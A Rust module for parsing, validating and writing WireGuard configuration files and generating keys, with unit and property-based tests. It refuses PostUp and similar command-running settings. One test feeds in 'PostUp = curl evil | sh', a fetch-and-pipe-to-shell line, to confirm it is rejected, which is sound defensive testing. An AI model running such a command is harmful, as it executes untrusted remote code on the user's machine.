//! WireGuard configs: the `.conf` format (as `wg-quick` reads it, minus the
//! parts that run commands), key generation, and nothing about NetworkManager.
//!
//! Keys are base64 of 32 bytes. Private keys and pre-shared keys live in
//! [`Secret`]s, which wipe themselves on drop and never show in `Debug`.

use std::net::IpAddr;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use nexus_ipc::Secret;
use x25519_dalek::{PublicKey, StaticSecret};
use zeroize::Zeroizing;

/// The local end of the tunnel.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Interface {
    pub private_key: Secret,
    /// Canonical `ip/prefix` text.
    pub addresses: Vec<String>,
    /// Resolver addresses.
    pub dns: Vec<String>,
    /// Search domains (the non-address entries of `DNS =`).
    pub search: Vec<String>,
    pub listen_port: Option<u16>,
    pub mtu: Option<u32>,
}

/// The remote end.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Peer {
    pub public_key: String,
    pub preshared_key: Option<Secret>,
    /// Canonical `ip/prefix` text.
    pub allowed_ips: Vec<String>,
    /// `host:port` or `[v6]:port`.
    pub endpoint: Option<String>,
    pub keepalive: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    pub interface: Interface,
    pub peers: Vec<Peer>,
}

/// Why a config was refused, in words for the person.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParseError {
    /// 1-based; 0 when the whole file is at fault.
    pub line: usize,
    pub message: String,
}

impl std::fmt::Display for ParseError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.line == 0 {
            f.write_str(&self.message)
        } else {
            write!(f, "line {}: {}", self.line, self.message)
        }
    }
}

fn err<T>(line: usize, message: impl Into<String>) -> Result<T, ParseError> {
    Err(ParseError {
        line,
        message: message.into(),
    })
}

/// Whether `key` is base64 of 32 bytes.
pub fn is_key(key: &str) -> bool {
    STANDARD
        .decode(key)
        .is_ok_and(|b| b.len() == 32 && STANDARD.encode(&b) == key)
}

/// A fresh key pair: `(private, public)`, both base64. The private key is
/// clamped like `wg genkey` does it; the intermediate bytes are wiped.
pub fn generate() -> (Secret, String) {
    let mut raw = Zeroizing::new([0u8; 32]);
    // Blocks on the entropy pool only before it is seeded at boot.
    let _ = rustix::rand::getrandom(raw.as_mut_slice(), rustix::rand::GetRandomFlags::empty());
    raw[0] &= 248;
    raw[31] = (raw[31] & 127) | 64;
    let secret = StaticSecret::from(*raw);
    let public = PublicKey::from(&secret);
    (
        Secret::new(STANDARD.encode(secret.as_bytes())),
        STANDARD.encode(public.as_bytes()),
    )
}

/// The public key that goes with a private key; `None` if it is not a key.
pub fn public_of(private_key: &str) -> Option<String> {
    let bytes = Zeroizing::new(STANDARD.decode(private_key).ok()?);
    let raw: Zeroizing<[u8; 32]> = Zeroizing::new(bytes.as_slice().try_into().ok()?);
    let secret = StaticSecret::from(*raw);
    Some(STANDARD.encode(PublicKey::from(&secret).as_bytes()))
}

/// `ip` or `ip/prefix` as canonical `ip/prefix` (a bare address is a host).
pub fn cidr(text: &str) -> Option<String> {
    let (ip, prefix) = match text.split_once('/') {
        Some((ip, prefix)) => (ip.trim(), Some(prefix.trim())),
        None => (text.trim(), None),
    };
    let ip: IpAddr = ip.parse().ok()?;
    let max = if ip.is_ipv4() { 32 } else { 128 };
    let prefix: u8 = match prefix {
        Some(p) if !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()) => p.parse().ok()?,
        Some(_) => return None,
        None => max,
    };
    (prefix <= max).then(|| format!("{ip}/{prefix}"))
}

/// `host:port` or `[v6]:port`, with a port from 1 to 65535.
pub fn is_endpoint(text: &str) -> bool {
    let Some((host, port)) = text.rsplit_once(':') else {
        return false;
    };
    let port_ok = !port.is_empty()
        && port.bytes().all(|b| b.is_ascii_digit())
        && port.parse::<u16>().is_ok_and(|p| p != 0);
    let host_ok = if let Some(inner) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        inner.parse::<std::net::Ipv6Addr>().is_ok()
    } else {
        is_domain(host) || host.parse::<std::net::Ipv4Addr>().is_ok()
    };
    port_ok && host_ok
}

fn is_domain(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 253
        && text
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_'))
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Section {
    None,
    Interface,
    Peer,
}

/// Reads a `.conf`. Comments (`#`), blank lines, any case of keys and
/// section names, comma lists and repeated list keys are accepted. Keys that
/// run commands (`PostUp` and friends) are refused rather than ignored.
pub fn parse(text: &str) -> Result<Config, ParseError> {
    let mut section = Section::None;
    let mut interface: Option<Interface> = None;
    let mut peers: Vec<Peer> = Vec::new();
    let mut private_seen = false;
    let mut peer_key_seen = false;
    let mut interface_line = 0;
    for (i, raw) in text.lines().enumerate() {
        let n = i + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            let Some(name) = rest.strip_suffix(']') else {
                return err(n, "a section header needs a closing ]");
            };
            match name.trim().to_ascii_lowercase().as_str() {
                "interface" => {
                    if interface.is_some() {
                        return err(n, "there can be only one [Interface] section");
                    }
                    interface_line = n;
                    interface = Some(Interface {
                        private_key: Secret::new(""),
                        addresses: Vec::new(),
                        dns: Vec::new(),
                        search: Vec::new(),
                        listen_port: None,
                        mtu: None,
                    });
                    section = Section::Interface;
                }
                "peer" => {
                    if peers.last().is_some() && !peer_key_seen {
                        return err(n - 1, "the previous [Peer] has no PublicKey");
                    }
                    peers.push(Peer {
                        public_key: String::new(),
                        preshared_key: None,
                        allowed_ips: Vec::new(),
                        endpoint: None,
                        keepalive: None,
                    });
                    peer_key_seen = false;
                    section = Section::Peer;
                }
                other => return err(n, format!("unknown section [{other}]")),
            }
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            return err(n, "expected `Key = value`");
        };
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        match section {
            Section::None => return err(n, "a setting before any [Interface] or [Peer] header"),
            Section::Interface => {
                let iface = interface.as_mut().expect("in an interface section");
                match key.as_str() {
                    "privatekey" => {
                        if private_seen {
                            return err(n, "PrivateKey is given twice");
                        }
                        if !is_key(value) {
                            return err(
                                n,
                                "PrivateKey is not a WireGuard key (44 base64 characters)",
                            );
                        }
                        private_seen = true;
                        iface.private_key = Secret::new(value);
                    }
                    "address" => {
                        for part in list(value) {
                            match cidr(part) {
                                Some(c) => iface.addresses.push(c),
                                None => return err(n, format!("`{part}` is not an address")),
                            }
                        }
                    }
                    "dns" => {
                        for part in list(value) {
                            if let Ok(ip) = part.parse::<IpAddr>() {
                                iface.dns.push(ip.to_string());
                            } else if is_domain(part) {
                                iface.search.push(part.to_owned());
                            } else {
                                return err(n, format!("`{part}` is not a DNS server"));
                            }
                        }
                    }
                    "listenport" => match value.parse::<u16>() {
                        Ok(p) => iface.listen_port = Some(p),
                        Err(_) => return err(n, "ListenPort must be a number from 0 to 65535"),
                    },
                    "mtu" => match value.parse::<u32>() {
                        Ok(m) if (576..=65535).contains(&m) => iface.mtu = Some(m),
                        _ => return err(n, "MTU must be a number from 576 to 65535"),
                    },
                    "preup" | "postup" | "predown" | "postdown" => {
                        return err(
                            n,
                            format!(
                                "{} runs a command, which Nexus does not do; remove it",
                                value_name(&key)
                            ),
                        );
                    }
                    // Settings that only matter to wg-quick's own routing.
                    "fwmark" | "table" | "saveconfig" => {}
                    _ => return err(n, format!("unknown setting `{}`", key_text(line))),
                }
            }
            Section::Peer => {
                let peer = peers.last_mut().expect("in a peer section");
                match key.as_str() {
                    "publickey" => {
                        if peer_key_seen {
                            return err(n, "PublicKey is given twice");
                        }
                        if !is_key(value) {
                            return err(
                                n,
                                "PublicKey is not a WireGuard key (44 base64 characters)",
                            );
                        }
                        peer_key_seen = true;
                        peer.public_key = value.to_owned();
                    }
                    "presharedkey" => {
                        if !is_key(value) {
                            return err(
                                n,
                                "PresharedKey is not a WireGuard key (44 base64 characters)",
                            );
                        }
                        peer.preshared_key = Some(Secret::new(value));
                    }
                    "allowedips" => {
                        for part in list(value) {
                            match cidr(part) {
                                Some(c) => peer.allowed_ips.push(c),
                                None => return err(n, format!("`{part}` is not a network")),
                            }
                        }
                    }
                    "endpoint" => {
                        if !is_endpoint(value) {
                            return err(n, "Endpoint must look like host:port");
                        }
                        peer.endpoint = Some(value.to_owned());
                    }
                    "persistentkeepalive" => match value {
                        "off" => peer.keepalive = None,
                        v => match v.parse::<u16>() {
                            Ok(k) => peer.keepalive = Some(k),
                            Err(_) => {
                                return err(n, "PersistentKeepalive must be seconds, or off");
                            }
                        },
                    },
                    _ => return err(n, format!("unknown setting `{}`", key_text(line))),
                }
            }
        }
    }
    if peers.last().is_some() && !peer_key_seen {
        return err(text.lines().count(), "the last [Peer] has no PublicKey");
    }
    let Some(interface) = interface else {
        return err(0, "there is no [Interface] section");
    };
    if !private_seen {
        return err(interface_line, "the [Interface] has no PrivateKey");
    }
    Ok(Config { interface, peers })
}

fn list(value: &str) -> impl Iterator<Item = &str> {
    value.split(',').map(str::trim).filter(|p| !p.is_empty())
}

fn key_text(line: &str) -> &str {
    line.split('=').next().unwrap_or(line).trim()
}

fn value_name(key: &str) -> &'static str {
    match key {
        "preup" => "PreUp",
        "postup" => "PostUp",
        "predown" => "PreDown",
        _ => "PostDown",
    }
}

/// Writes a config back as `.conf` text. The result holds the private key, so
/// it wipes itself when dropped.
pub fn render(config: &Config) -> Zeroizing<String> {
    let i = &config.interface;
    let mut out = Zeroizing::new(String::from("[Interface]\n"));
    out.push_str(&format!("PrivateKey = {}\n", i.private_key.expose()));
    if !i.addresses.is_empty() {
        out.push_str(&format!("Address = {}\n", i.addresses.join(", ")));
    }
    let dns: Vec<&str> = i.dns.iter().chain(&i.search).map(String::as_str).collect();
    if !dns.is_empty() {
        out.push_str(&format!("DNS = {}\n", dns.join(", ")));
    }
    if let Some(p) = i.listen_port {
        out.push_str(&format!("ListenPort = {p}\n"));
    }
    if let Some(m) = i.mtu {
        out.push_str(&format!("MTU = {m}\n"));
    }
    for peer in &config.peers {
        out.push_str("\n[Peer]\n");
        out.push_str(&format!("PublicKey = {}\n", peer.public_key));
        if let Some(k) = &peer.preshared_key {
            out.push_str(&format!("PresharedKey = {}\n", k.expose()));
        }
        if !peer.allowed_ips.is_empty() {
            out.push_str(&format!("AllowedIPs = {}\n", peer.allowed_ips.join(", ")));
        }
        if let Some(e) = &peer.endpoint {
            out.push_str(&format!("Endpoint = {e}\n"));
        }
        if let Some(k) = peer.keepalive {
            out.push_str(&format!("PersistentKeepalive = {k}\n"));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    // A key pair from the WireGuard quick start documentation shape: any
    // 32 bytes work; these are fixed so failures are reproducible.
    const PRIV: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PEER: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn sample() -> String {
        format!(
            "# provider config\n[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2/32, fd00::2\nDNS = 1.1.1.1, example.net\nMTU = 1380\n\n[peer]\npublickey={PEER}\nAllowedIPs = 0.0.0.0/0, ::/0 # all of it\nEndpoint = vpn.example.net:51820\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn reads_a_provider_config() {
        let c = parse(&sample()).unwrap();
        assert_eq!(c.interface.private_key.expose(), PRIV);
        assert_eq!(c.interface.addresses, ["10.0.0.2/32", "fd00::2/128"]);
        assert_eq!(c.interface.dns, ["1.1.1.1"]);
        assert_eq!(c.interface.search, ["example.net"]);
        assert_eq!(c.interface.mtu, Some(1380));
        assert_eq!(c.peers.len(), 1);
        assert_eq!(c.peers[0].public_key, PEER);
        assert_eq!(c.peers[0].allowed_ips, ["0.0.0.0/0", "::/0"]);
        assert_eq!(
            c.peers[0].endpoint.as_deref(),
            Some("vpn.example.net:51820")
        );
        assert_eq!(c.peers[0].keepalive, Some(25));
    }

    #[test]
    fn render_then_parse_is_the_same_config() {
        let c = parse(&sample()).unwrap();
        assert_eq!(parse(&render(&c)).unwrap(), c);
    }

    #[test]
    fn errors_name_the_line() {
        let bad = sample().replace("Address = 10.0.0.2/32", "Address = 10.0.0/33");
        let e = parse(&bad).unwrap_err();
        assert_eq!(e.line, 4);
        assert!(e.message.contains("10.0.0/33"), "{e}");
    }

    #[test]
    fn commands_are_refused() {
        let bad = sample().replace("MTU = 1380", "PostUp = curl evil | sh");
        let e = parse(&bad).unwrap_err();
        assert!(e.message.contains("PostUp"), "{e}");
    }

    #[test]
    fn needs_an_interface_and_a_private_key() {
        assert_eq!(parse("").unwrap_err().line, 0);
        assert!(
            parse("[Interface]\nAddress = 10.0.0.2/32\n")
                .unwrap_err()
                .message
                .contains("PrivateKey")
        );
    }

    #[test]
    fn generated_keys_match_and_differ() {
        let (private, public) = generate();
        assert!(is_key(private.expose()) && is_key(&public));
        assert_eq!(
            public_of(private.expose()).as_deref(),
            Some(public.as_str())
        );
        assert_ne!(private, generate().0);
    }

    #[test]
    fn public_key_matches_the_wireguard_reference_vector() {
        // From the x25519 test in RFC 7748 section 6.1 (Alice), as base64.
        let alice_priv = STANDARD.encode(hex(
            "77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a",
        ));
        let alice_pub = STANDARD.encode(hex(
            "8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a",
        ));
        assert_eq!(public_of(&alice_priv), Some(alice_pub));
    }

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
            .collect()
    }

    #[test]
    fn endpoints_and_networks() {
        assert!(is_endpoint("[2001:db8::1]:51820"));
        assert!(is_endpoint("203.0.113.9:1"));
        assert!(!is_endpoint("203.0.113.9"));
        assert!(!is_endpoint("host:0"));
        assert!(!is_endpoint("2001:db8::1:51820"));
        assert_eq!(cidr("10.0.0.0/8").as_deref(), Some("10.0.0.0/8"));
        assert_eq!(cidr("::1").as_deref(), Some("::1/128"));
        assert_eq!(cidr("10.0.0.1/"), None);
        assert_eq!(cidr("10.0.0.1/+8"), None);
    }
}

#[cfg(test)]
mod fuzz {
    use super::*;
    use proptest::prelude::*;

    fn key() -> impl Strategy<Value = String> {
        prop::array::uniform32(any::<u8>()).prop_map(|b| STANDARD.encode(b))
    }

    fn net() -> impl Strategy<Value = String> {
        prop_oneof![
            (any::<[u8; 4]>(), 0u8..=32)
                .prop_map(|(o, p)| format!("{}/{p}", std::net::Ipv4Addr::from(o))),
            (any::<[u8; 16]>(), 0u8..=128)
                .prop_map(|(o, p)| format!("{}/{p}", std::net::Ipv6Addr::from(o))),
        ]
    }

    fn peer() -> impl Strategy<Value = Peer> {
        (
            key(),
            prop::option::of(key()),
            prop::collection::vec(net(), 0..4),
            prop::option::of((1u16..=65535).prop_map(|p| format!("vpn.example.org:{p}"))),
            prop::option::of(1u16..=3600),
        )
            .prop_map(|(public_key, psk, allowed_ips, endpoint, keepalive)| Peer {
                public_key,
                preshared_key: psk.map(Secret::new),
                allowed_ips,
                endpoint,
                keepalive,
            })
    }

    fn config() -> impl Strategy<Value = Config> {
        (
            key(),
            prop::collection::vec(net(), 0..3),
            prop::collection::vec(any::<[u8; 4]>(), 0..3),
            prop::option::of(any::<u16>()),
            prop::option::of(576u32..=65535),
            prop::collection::vec(peer(), 0..3),
        )
            .prop_map(|(k, addresses, dns, listen_port, mtu, peers)| Config {
                interface: Interface {
                    private_key: Secret::new(k),
                    addresses,
                    dns: dns
                        .into_iter()
                        .map(|o| std::net::Ipv4Addr::from(o).to_string())
                        .collect(),
                    search: Vec::new(),
                    listen_port,
                    mtu,
                },
                peers,
            })
    }

    proptest! {
        /// Whatever bytes arrive, the parser answers; it never panics.
        #[test]
        fn arbitrary_text_never_panics(text in "\\PC{0,400}") {
            let _ = parse(&text);
        }

        /// Text shaped like a config but mangled still never panics.
        #[test]
        fn mangled_configs_never_panic(c in config(), cut in 0usize..600, junk in "\\PC{0,8}") {
            let mut text = render(&c).to_string();
            let at = cut.min(text.len());
            let at = (0..=at).rev().find(|i| text.is_char_boundary(*i)).unwrap_or(0);
            text.insert_str(at, &junk);
            let _ = parse(&text);
        }

        /// Everything the renderer writes, the parser reads back unchanged.
        #[test]
        fn rendered_configs_round_trip(c in config()) {
            let text = render(&c);
            prop_assert_eq!(parse(&text).unwrap(), c);
        }

        /// Any key pair's public key is a valid key and stable.
        #[test]
        fn public_keys_are_keys(k in key()) {
            let p = public_of(&k).unwrap();
            prop_assert!(is_key(&p));
            prop_assert_eq!(public_of(&k), Some(p));
        }
    }
}
